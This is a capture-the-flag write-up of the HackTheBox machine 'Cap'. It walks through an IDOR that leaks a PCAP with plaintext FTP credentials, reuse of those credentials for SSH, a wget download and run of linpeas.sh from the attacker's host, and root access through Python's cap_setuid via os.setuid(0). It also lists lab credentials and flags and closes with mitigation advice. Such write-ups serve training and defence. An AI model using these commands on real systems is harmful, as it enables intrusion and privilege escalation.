# CAP - HackTheBox Writeup

**Date:** 16.03.2026  
**OS:** Unix, Linux  
**IP Address:** 10.129.10.77  
**Difficulty:** Easy  
**Points:** 0  

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Cap**. 

*   **Initial Access:** Discovery of a PCAP file via IDOR on the web server, which contained plaintext FTP credentials. These credentials were then reused for SSH access.
*   **Privilege Escalation:** Exploitation of the `cap_setuid` capability on the `/usr/bin/python3.8` binary to elevate privileges to root.
*   **Key Learning Points:** 
    * Insecure Direct Object Reference (IDOR) leading to sensitive data exposure.
    * The danger of plaintext protocols (FTP) in network captures.
    * Misconfigured Linux Capabilities as a vector for privilege escalation.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port          | Service   | Version       | Notes                             |
| :---          | :---      | :---          | :---                              |
| 21            | ftp       | vsftpd 3.0.3  | Allowed plaintext login           |
| 22            | ssh       | OpenSSH 8.2p1 | Use for terminal access           |
| 80            | http      | Gunicorn      | Web application hosting PCAP data | 

<br>

**Nmap Command:**
```bash
nmap -sC -sV -oA nmap/initial_scan 10.129.10.77
```

The command returns: 

```bash 
# Nmap 7.98 scan initiated Mon Mar 16 17:37:38 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -oA ./nmap/inital_scan 10.129.10.77
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.129.10.77
Host is up (0.14s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp   open     http    Gunicorn
4343/tcp filtered unicall
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 16 18:05:26 2026 -- 1 IP address (1 host up) scanned in 1668.70 seconds

```

## 2.2. Web Enumeration
**Strategy:** Explored the web interface, focusing on URL parameters and potential data exposure.

The application features a __Security Snapshot (5 Second PCAP + Analysis)__ tab that allows users to view and download PCAP files. By manipulating the ID in the URL (IDOR), I was able to access captures that I shouldn't have seen. Specifically, accessing `http://10.129.10.77/data/0` allowed me to download `0.pcap`. I examined this file using Wireshark.

```bash
wireshark 0.pcap
```

After examining the `0.pcap` file, I found a capture of an FTP session. By following the TCP stream (`tcp.stream eq 3`), I recovered plaintext credentials.

```
    220 (vsFTPd 3.0.3)

    USER nathan

    331 Please specify the password.

    PASS Buck3tH4TF0RM3!

    230 Login successful.

    SYST

    215 UNIX Type: L8

    PORT 192,168,196,1,212,140

    200 PORT command successful. Consider using PASV.

    LIST

    150 Here comes the directory listing.
    226 Directory send OK.

    PORT 192,168,196,1,212,141

    200 PORT command successful. Consider using PASV.

    LIST -al

    150 Here comes the directory listing.
    226 Directory send OK.

    TYPE I

    200 Switching to Binary mode.

    PORT 192,168,196,1,212,143

    200 PORT command successful. Consider using PASV.

    RETR notes.txt

    550 Failed to open file.

    QUIT

    221 Goodbye.
```

> **Credentials Found:** `nathan` : `Buck3tH4TF0RM3!`

I successfully verified these credentials by logging into the FTP service:

```bash
    ftp 10.129.10.77
    Connected to 10.129.10.77.
    220 (vsFTPd 3.0.3)
    Name (10.129.10.77:rf2i): nathan
    331 Please specify the password.
    Password: Buck3tH4TF0RM3!
    230 Login successful.

```
---

# 3. Initial Access (User Flag)

After obtaining the credentials from the PCAP, I verified them via FTP. The `user.txt` file was found in the home directory, which I downloaded to my local machine.

**Payload/Tool:**
```bash
ftp> dir 
229 Entering Extended Passive Mode (|||28841|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Mar 16 16:04 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||44193|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |*************************************************************************************************************************|    33      657.68 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (1.19 KiB/s)
ftp> 

```

**User Flag:**
```bash
cat user.txt

66056baa4cca0ef4d9586306ed7780e0
```
To gain a full interactive shell, I attempted to use the same credentials for SSH on port 22. The password reuse proved successful.

```bash
ssh nathan@10.129.10.77
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.129.10.77 password:Buck3tH4TF0RM3!
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 16 20:28:42 UTC 2026

  System load:           0.03
  Usage of /:            36.8% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             222
  Users logged in:       0
  IPv4 address for eth0: 10.129.10.77
  IPv6 address for eth0: dead:beef::250:56ff:fe94:3e86


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ 


```

---

# 4. Privilege Escalation (Root Flag)

With a stable SSH session, I performed local enumeration. I used `linpeas.sh` to automate the search for privilege escalation vectors. 

I hosted the script using a Python HTTP server on my local machine:


```bash 
python3 -m http.server 8000
```

and got the file on the target machine using wget: 

```bash
nathan@cap:~$ wget 10.10.15.140:8000/linpeas.sh                                                                                                                       
nathan@cap:~$ chmod +x linpeas.sh                                                                                                                                     
nathan@cap:~$ ./linpeas.sh
```


`linpeas.sh` identified several files with interesting capabilities. The most notable was the Python binary:

```bash                      
Files with capabilities (limited to 50):                                           
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The `cap_setuid` capability allows the binary to manipulate its own UID. Since it is owned by root, a user running this binary can set their UID to 0 (root) within the Python process.

I exploited this by using the `os.setuid(0)` function to elevate to root.

```bash
nathan@cap:~$ python3
>>> import os
>>> os.setuid(0)
>>> os.system('whoami')
root
>>> os.system('sh')
# whoami
root
```
So the last thing that was to do was claiming the Rootflag: 


**Root Flag:**
```bash
cat /root/root.txt

63022da694221a0b404171d317f5a2b8
```

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| nathan | Buck3tH4TF0RM3! | 0.pcap (via IDOR) |
| nathan (SSH) | Buck3tH4TF0RM3! | Password Reuse |
| root | - | Privilege Escalation (Python Capability) |
| user flag | 66056baa4cca0ef4d9586306ed7780e0 | user.txt |
| root flag | 63022da694221a0b404171d317f5a2b8 | root.txt |

---

# 6. Recommendations & Mitigation
1. **Insecure Direct Object Reference (IDOR):** The application allows users to access any PCAP file by changing the ID in the URL. Access control should be implemented to ensure users can only access their own data.
2. **Insecure Linux Capabilities:** The Python binary has the `cap_setuid` capability, which allows any user to gain root privileges. Capabilities should be assigned following the principle of least privilege, and sensitive capabilities like `cap_setuid` should not be granted to general-purpose interpreters.
3. **Plaintext Protocols:** FTP transmits credentials in plaintext. The service should be replaced with a secure alternative like SFTP or FTPS.


